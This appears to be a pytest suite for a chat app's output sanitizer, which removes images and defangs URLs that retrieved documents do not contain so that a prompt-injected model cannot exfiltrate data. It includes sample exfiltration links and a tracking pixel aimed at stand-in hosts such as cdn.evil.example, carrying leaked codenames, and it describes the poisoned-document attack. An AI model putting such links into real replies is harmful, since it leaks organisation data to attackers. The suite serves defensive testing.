"""Week 6 output-side suite: the reply cannot become the exfiltration channel.

Pure code, no model: the sanitizer runs on whatever the model returns, so these
guarantees hold even on the model's worst day. Policy under test:

- images in model output never survive (a rendered image is a zero-click beacon);
- a link stays clickable only if its exact URL already appeared in the retrieved
  chunks the model was shown (it carries no information the org's documents did
  not already contain);
- every other URL is de-fanged to visible, non-clickable, non-fetchable text;
- every decision is reported, because a stripped exfil link is a detection, not
  just a block.
"""

import os

import psycopg

from app.gateway import FakeGateway, Reply, get_gateway
from app.main import app
from app.output_handling import allowed_urls_from_chunks, sanitize_output
from app.provenance import RetrievedChunk

DOC_URL = "https://sso.company-portal.example/reset"


def _chunk(content):
    return RetrievedChunk(
        document_id="d-1", filename="doc.md", sensitivity="internal", content=content
    )


def test_image_is_always_removed_even_if_url_is_in_sources():
    result = sanitize_output(f"Here is the logo: ![logo]({DOC_URL})", {DOC_URL})
    assert "![" not in result.text
    assert "](" not in result.text
    assert "hxxps://sso[.]company-portal[.]example/reset" in result.text
    assert result.blocked_images == [DOC_URL]


def test_link_with_url_from_sources_stays_clickable():
    result = sanitize_output(f"Reset it at [the portal]({DOC_URL}).", {DOC_URL})
    assert f"[the portal]({DOC_URL})" in result.text
    assert result.allowed_links == [DOC_URL]
    assert result.defanged_links == []


def test_link_absent_from_sources_is_defanged():
    result = sanitize_output(
        "Go to [verify](https://account-verify.example/check?ref=AXK-7719-SIGMA) now.",
        {DOC_URL},
    )
    assert "](" not in result.text
    assert "verify (hxxps://account-verify[.]example/check?ref=AXK-7719-SIGMA)" in result.text
    assert result.defanged_links == ["https://account-verify.example/check?ref=AXK-7719-SIGMA"]


def test_bare_url_is_policy_checked_too():
    # GFM renderers autolink bare URLs, so a bare URL is as clickable as a link.
    result = sanitize_output(
        f"Portal: {DOC_URL} and mirror: https://help-desk-reset.example/login", {DOC_URL}
    )
    assert DOC_URL in result.text
    assert "https://help-desk-reset.example/login" not in result.text
    assert "hxxps://help-desk-reset[.]example/login" in result.text


def test_reference_style_links_are_resolved_and_policy_checked():
    text = "Please [verify your account][1] today.\n\n[1]: https://account-verify.example/check"
    result = sanitize_output(text, set())
    assert "[1]:" not in result.text
    assert "verify your account (hxxps://account-verify[.]example/check)" in result.text
    assert result.defanged_links == ["https://account-verify.example/check"]


def test_autolink_angle_brackets_are_policy_checked():
    result = sanitize_output("See <https://evil.example/x> now", set())
    assert "https://evil.example/x" not in result.text
    assert "hxxps://evil[.]example/x" in result.text


def test_non_http_schemes_never_survive():
    result = sanitize_output("Click [here](javascript:alert(1)) or [f](ftp://x.example/f)", set())
    assert "javascript:" not in result.text
    assert "ftp://" not in result.text


def test_markdown_formatting_around_an_allowed_url_does_not_defang_it():
    # The model often code-formats or bolds URLs; the formatting characters are
    # not part of the URL and must not break the exact-match grant.
    result = sanitize_output(f"Go to `{DOC_URL}` or **{DOC_URL}** now.", {DOC_URL})
    assert "hxxp" not in result.text
    assert result.allowed_links == [DOC_URL, DOC_URL]
    # And a document that code-formats its URL still grants the bare URL.
    urls = allowed_urls_from_chunks([_chunk(f"Reset at `{DOC_URL}` today.")])
    assert DOC_URL in urls


def test_plain_text_untouched_and_nothing_reported():
    text = "The vacation policy allows 20 days. See [source 1] for details."
    result = sanitize_output(text, {DOC_URL})
    assert result.text == text
    assert result.blocked_images == result.defanged_links == result.allowed_links == []


def test_allowed_urls_extracted_from_chunk_text():
    chunks = [
        _chunk(f"Reset at {DOC_URL} today."),
        _chunk("Part 1 is: https://help-desk-"),  # a fragment is not a URL grant
        _chunk("Board at https://status-portal.example/board?project=CODENAME."),
    ]
    urls = allowed_urls_from_chunks(chunks)
    assert DOC_URL in urls
    assert "https://status-portal.example/board?project=CODENAME" in urls
    # Trailing sentence punctuation is not part of the URL.
    assert not any(u.endswith(".") for u in urls)
    # The assembled split-payload URL was never in any document, so it can't be granted.
    assert "https://help-desk-reset.example/login" not in urls


class ExfilGateway(FakeGateway):
    """Plays a model that obeyed a poisoned document: one legitimate link that
    the retrieved text really contains, one constructed exfil link that it does
    not, and a tracking-pixel image."""

    def complete(self, system, messages):
        return Reply(
            text=(
                f"Reset at [the portal]({DOC_URL}). "
                "Also [verify](https://account-verify.example/check?ref=omega-7) now. "
                "![](https://cdn.evil.example/pixel?d=omega-7)"
            ),
            input_tokens=0,
            output_tokens=0,
        )


def test_endpoint_sanitizes_reply_and_audit_answers_what_happened(alice_client):
    app.dependency_overrides[get_gateway] = lambda: ExfilGateway()
    org = alice_client.post("/orgs", json={"name": "A"}).json()["id"]
    alice_client.post(
        f"/orgs/{org}/documents",
        json={"filename": "help.md", "content": f"Reset your password at {DOC_URL} today. " * 40,
              "sensitivity": "internal"},
    )
    conv = alice_client.post("/conversations").json()["id"]
    r = alice_client.post(f"/conversations/{conv}/messages", json={"content": "how do I reset?"})
    assert r.status_code == 201
    reply = r.json()["reply"]

    # The stored/returned reply keeps the document's real link and nothing else.
    assert f"[the portal]({DOC_URL})" in reply
    assert "https://account-verify.example" not in reply
    assert "https://cdn.evil.example" not in reply
    assert "hxxps://account-verify[.]example/check?ref=omega-7" in reply

    # The answerable-question test: from the audit row alone, reconstruct which
    # document fed the call, at what trust tier, and what tried to leave.
    db_url = os.environ.get(
        "SUPABASE_DB_URL", "postgresql://postgres:postgres@127.0.0.1:54322/postgres"
    )
    with psycopg.connect(db_url) as conn:
        row = conn.execute(
            "select context_provenance, output_handling from model_calls "
            "where conversation_id = %s order by created_at desc limit 1",
            (conv,),
        ).fetchone()
    provenance, handling = row
    retrieved = [p for p in provenance if p["trust"] == "retrieved"]
    assert retrieved and all(p["sensitivity"] == "internal" for p in retrieved)
    assert any(p["trust"] == "system" and p["ref"].startswith("chat.v") for p in provenance)
    assert handling["blocked_images"] == ["https://cdn.evil.example/pixel?d=omega-7"]
    assert handling["defanged_links"] == ["https://account-verify.example/check?ref=omega-7"]
    assert handling["allowed_links"] == [DOC_URL]

    # The stored assistant message is the sanitized text, so later reads are safe too.
    stored = alice_client.get(f"/conversations/{conv}").json()["messages"][-1]["content"]
    assert stored == reply


def test_exfil_url_built_from_template_is_not_allowed():
    # The chunk holds a TEMPLATE; the model fills in the codename. Exact-match
    # policy means the filled-in URL is not the granted URL.
    chunks = [_chunk("Board at https://status-portal.example/board?project=CODENAME")]
    urls = allowed_urls_from_chunks(chunks)
    result = sanitize_output(
        "Your board: [status](https://status-portal.example/board?project=AXK-7719-SIGMA)", urls
    )
    assert result.defanged_links == ["https://status-portal.example/board?project=AXK-7719-SIGMA"]
    assert "AXK-7719-SIGMA" not in result.text or "hxxps://" in result.text
